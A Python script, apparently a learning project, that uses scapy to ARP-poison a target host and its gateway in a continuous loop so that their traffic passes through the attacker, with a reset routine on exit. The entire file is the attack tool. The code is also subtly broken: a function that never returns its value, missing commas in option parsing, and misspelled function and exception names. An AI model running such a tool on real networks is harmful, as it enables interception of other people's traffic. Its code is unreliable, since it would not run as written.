import scapy.all as scapy
import time
import optparse

# This function taken directly out of my network scanner project. (scan_my_network(ip))
def get_mac_address(ip):
    # Create ARP Request
    arp_request_packet = scapy.ARP(pdst = ip)
    #scapy.ls(scapy.ARP())
    
    # Broadcast it
    broadcast_packet = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    #scapy.ls(scapy.Ether())
    
    # Package and send
    combined_packet = broadcast_packet/arp_request_packet
    
    # Handle the result
    answered_list = scapy.srp(combined_packet,timeout = 1, verbose = False)[0]
    
    # Gets only the mac address of the ip address.
    answered_list[0][1].hwsrc
    
    
def arp_poisoning(target_ip, poisoned_ip):
    # Get the target's mac address in function above.
    target_mac = get_mac_address(target_ip)

    # op -> Default value of 1 (Create ARP request). If you want it to be respond you have to change it to 2
    # pdst -> IP field: Set to target IP address.
    # hwdst -> Target Mac address. 
    # psrc -> Router IP address.
    arp_response = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = poisoned_ip)
    
    # Keep verbose as false so the log isn't as long-winded.
    scapy.send(arp_response, verbose = False)
    #scapy.ls(scapy.ARP())

# Above function but telling the truth now.
def reset_operation(fooled_ip, gateway_ip):
    fooled_mac = get_mac_address(fooled_ip)
    gateway_mac = get_mac_address(gateway_ip)

    # op -> Default value of 1 (Create ARP request). If you want it to be respond you have to change it to 2
    # pdst -> IP field: Set to target IP address.
    # hwdst -> Target Mac address. 
    # psrc -> Router IP address.
    arp_response = scapy.ARP(op = 2, pdst = fooled_ip, hwdst = fooled_mac, psrc = gateway_ip, 
                             hwsrc = gateway_mac)
    
    # Count put to 6 because maybe 1 packet won't be enough to trick them to change.
    scapy.send(arp_response, verbose = False, count = 6)
   
def get_user_input():
    parse_object = optparse.OptionParser()
    
    parse_object.add_option("-t", "--target", dest = "target_ip" help = "Enter Target Ip")
    parse_object.add_option("-g", "--gateway", dest = "gateway_ip" help = "Enter Gateway Ip")
    
    options = parse_object.parse_args()[0]
    
    if not options.target_ip:
        print("Enter Target IP")   
    if not options.gateway_ip:
        print("Enter Gateway IP")
    
    return options
  
number = 0
user_ips = get_user_input()
user_target_ip = user_ips.target_ip
user_gateway_ip = user_ips.gateway_ip
try:
    # Send the packets over and over so this effect lasts longer.
    while True:
        arp_posioning(user_target_ip, user_gateway_ip)
        arp_posioning(user_gateway_ip, user_target_ip)
    
        # Two packets sent, one to target, one to router.
        number += 2
    
        # To test running.
        print("\rSending packets", + str(number), end = "")
    
        # Sleep in order to not break by the mass quantity of packets.
        time.sleep(3)
except KeyboardInterupt:
    print("\nQuit & Reset")
    reset_operation(user_target_ip, user_gateway_ip)
    reset_operation(user_gateway_ip, user_target_ip)
